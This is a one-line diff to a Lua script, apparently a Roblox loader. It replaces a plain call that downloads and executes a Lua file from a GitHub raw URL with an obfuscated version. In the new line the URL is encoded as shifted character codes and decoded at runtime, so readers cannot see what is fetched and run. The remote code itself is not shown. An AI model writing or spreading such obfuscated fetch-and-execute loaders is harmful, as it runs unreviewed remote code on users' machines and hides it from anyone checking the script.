@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/iSacredRivals/API.Luarmor.loader/main/V3.lua"))()
+loadstring(game:HttpGet((function() local n={109,121,121,117,120,63,52,52,119,102,124,51,108,110,121,109,122,103,122,120,106,119,104,116,115,121,106,115,121,51,104,116,114,52,110,88,102,104,119,106,105,87,110,123,102,113,120,52,70,85,78,51,81,122,102,119,114,116,119,51,113,116,102,105,106,119,52,114,102,110,115,52,91,56,51,113,122,102} local r="" for i=1,#n do r=r..string.char((n[i]-5)%256) end return r end)()))()
